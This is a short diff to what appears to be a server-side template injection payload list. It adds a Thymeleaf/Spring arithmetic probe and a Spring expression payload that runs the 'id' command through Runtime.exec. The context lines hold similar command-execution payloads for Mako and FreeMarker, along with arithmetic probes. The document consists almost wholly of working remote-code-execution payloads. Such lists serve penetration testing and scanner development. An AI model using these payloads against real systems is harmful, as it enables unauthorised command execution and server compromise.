@@ -69,6 +69,8 @@ ${self.template.module.runtime.util.os.system("id")}
 ${{3*3}}
 ${{7*7}}
 ${{<%[%'"}}%\
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 42*42
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 <%= 3 * 3 %>
